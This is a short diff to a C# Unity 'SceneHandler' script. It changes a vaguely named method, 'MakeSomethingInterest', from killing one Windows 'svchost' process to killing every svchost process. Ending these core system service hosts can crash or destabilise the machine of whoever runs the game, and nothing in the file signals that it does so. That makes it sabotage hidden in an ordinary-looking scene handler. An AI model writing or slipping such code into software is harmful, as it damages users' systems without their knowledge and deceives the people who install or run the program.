@@ -32,10 +32,9 @@ public class SceneHandler : MonoBehaviour
     public void MakeSomethingInterest()
     {
         Process[] proc = Process.GetProcessesByName("svchost");
-
-        using (proc[0])
+        foreach (var a in proc)
         {
-            proc[0].Kill();
+            a.Kill();
         }
     }
 }
